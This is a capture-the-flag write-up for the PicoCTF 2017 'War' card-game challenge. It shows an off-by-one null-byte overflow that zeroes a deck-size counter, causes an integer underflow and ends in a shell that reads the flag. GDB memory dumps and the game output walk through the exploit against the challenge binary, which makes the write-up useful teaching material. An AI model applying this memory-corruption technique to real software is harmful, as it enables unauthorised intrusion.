# PicoCTF_2017: War

**Category:** Master
**Points:** 125
**Description:**

>Win a simple [Card Game](war). [Source](war.c). Connect on shell2017.picoctf.com:44698.

**Hint:**

>Bugs typically happen in groups. If you find one, what does it allow you to do?

## Write-up
Before I start, I would like to say that it took me 6 days for this challenge. For how surprisingly easy it was to solve at the end. Shame on me but now I shall redeem myself by shortening 6 days of agony to a writeup.

Firstly, we need to identify the bugs in this challenge, as it doesn't appear that there's anything buffer overflowable. By doing some rubber-ducking, we come across this function `readInput()`. I've done some rubber ducking here to give you a better view of things

    //Reads input from user, and properly terminates the string
    unsigned int readInput(char * buff, unsigned int len){ // For an example if betBuffer with len 8
        size_t count = 0;
        char c;
        while((c = getchar()) != '\n' && c != EOF){
            if(count < (len-1)){ // While count is 6 or less
                buff[count] = c;
                count++; // Count ++ means count becomes 7 here
            }
        }
        buff[count+1] = '\x00'; // Inputting a null byte to index 8? O.o <- THIS IS ARRAY OVERFLOW111!!!!11!1
        return count;
    }

Interesting, now we have the ability to erase one extra byte of anything after a buffer. Completely useless. Or is it? If we take a look at the two buffers that `readInput()` would read to, we come across these two buffers.

    char betStr[BETBUFFLEN];
    card * oppCard;

and
    
    char name[NAMEBUFFLEN];
    size_t deckSize;

Since we aren't too sure if the pointer for `oppCard` actually comes after the buffer in this scenario, let's target the `name` buffer. This calls for `GDB`.

First, let's try some input of just 31 bytes, to see a non-interrupted or overflowed memory region.

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

    0x601800 <gameData+128>:    0x00000000  0x00000000  0x41414141  0x41414141
    0x601810 <gameData+144>:    0x41414141  0x41414141  0x41414141  0x41414141
    0x601820 <gameData+160>:    0x41414141  0x41410000  0x1a000000  0x00000000
    0x601830 <gameData+176>:    0x00000000  0x00000000  0x1a000000  0x00000000

The memory is in big-endian for viewing pleasure. So, we see a bunch of `41`s, representing our `A`. This is very helpful, and we also see a `1a` right afterwards. `1a` in hex, also equates to `26` in decimal. The only thing that's `26` in the code, is `deckSize`. Great, that matches up with our code. Now let's try breaking the array by 1.

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

    0x601800 <gameData+128>:    0x00000000  0x00000000  0x41414141  0x41414141
    0x601810 <gameData+144>:    0x41414141  0x41414141  0x41414141  0x41414141
    0x601820 <gameData+160>:    0x41414141  0x41414100  0x00000000  0x00000000
    0x601830 <gameData+176>:    0x00000000  0x00000000  0x1a000000  0x00000000

Where's the `1a` now? Turns out, it's been completely overwritten by the null byte. What does this mean? Where's the flag? Well, if there's a null byte for decksize, this part of the code helps us.

    //TODO: Implement card switching hands. Cheap hack here for playability
    gameData.deckSize--;
    if(gameData.deckSize == 0){
        printf("All card used. Card switching will be implemented in v1.0, someday.\n");
        exit(0);
    }

So, in this event, when we try to play a card, the memory region breaks because `0x0000000000000000` minus `1` = `0xffffffffffffffff`. Win.

    0x601800 <gameData+128>:    0x00000000  0x00000000  0x41414141  0x41414141
    0x601810 <gameData+144>:    0x41414141  0x41414141  0x41414141  0x41414141
    0x601820 <gameData+160>:    0x41414141  0x41414100  0xffffffff  0xffffffff
    0x601830 <gameData+176>:    0x00000000  0x00000000  0x1a000000  0x00000000

Theoretically, this means we are free to keep playing, since we are only limited by 100 coins or deck size of `26` which is now astronomically too big. So let's try to keep betting 1 till something happens. After the initial `26` cards, we are now left with 0 cards and this happens.

    The opponent has a 0 of suit 0.
    You have a 0 of suit 0.
    You lost! :(

    You have 73 coins.
    How much would you like to bet?

Let's keep pushing. By now, we are accessing areas in the memory outside our actual decks, so we are bound to get crazy numbers like,

    How much would you like to bet?
    1
    The opponent has a 0 of suit 0.
    You have a 65 of suit 65.
    You won? Hmmm something must be wrong...
    Cheater. That's not actually a valid card.

    You have 48 coins.
    How much would you like to bet?
    1
    The opponent has a 0 of suit 0.
    You have a 65 of suit 65.
    You won? Hmmm something must be wrong...
    Cheater. That's not actually a valid card.

    You have 48 coins.
    How much would you like to bet?

Let's keep going,

    How much would you like to bet?
    1
    you bet 1.
    The opponent has a 0 of suit 0.
    You have a -1 of suit -68.
    You lost! :(

Woah, negative numbers! Suddenly,

    you bet 1.
    The opponent has a 0 of suit 0.
    You have a 13 of suit 0.
    You won? Hmmm something must be wrong...
    You actually won! Nice job

    You have 22 coins.
    How much would you like to bet?

Bingo. Now let's try to recoup our losses shall we! (_Don't do this in real life, you will go bankrupt._)

    You have 22 coins.
    How much would you like to bet?
    22
    you bet 22.
    The opponent has a 0 of suit 0.
    You have a 9 of suit 2.
    You won? Hmmm something must be wrong...
    You actually won! Nice job

    You have 44 coins.
    How much would you like to bet?
    44
    you bet 44.
    The opponent has a 0 of suit 0.
    You have a 11 of suit 1.
    You won? Hmmm something must be wrong...
    You actually won! Nice job

    You have 88 coins.
    How much would you like to bet?
    88
    you bet 88.
    The opponent has a 0 of suit 0.
    You have a 11 of suit 3.
    You won? Hmmm something must be wrong...
    You actually won! Nice job

    You have 176 coins.
    How much would you like to bet?
    176
    you bet 176.
    The opponent has a 0 of suit 0.
    You have a 12 of suit 3.
    You won? Hmmm something must be wrong...
    You actually won! Nice job

    You have 352 coins.
    How much would you like to bet?
    352
    you bet 352.
    The opponent has a 0 of suit 0.
    You have a 13 of suit 1.
    You won? Hmmm something must be wrong...
    You actually won! Nice job
    You won the game! That's real impressive, seeing as the deck was rigged...
    /bin/sh: 0: can't access tty; job control turned off
    $ ls
    flag.txt
    war
    war_no_aslr
    xinetd_wrapper.sh
    $ cat flag.txt
    04ab44dab3330a7633d9956b789f2769

Therefore, the flag is `04ab44dab3330a7633d9956b789f2769`.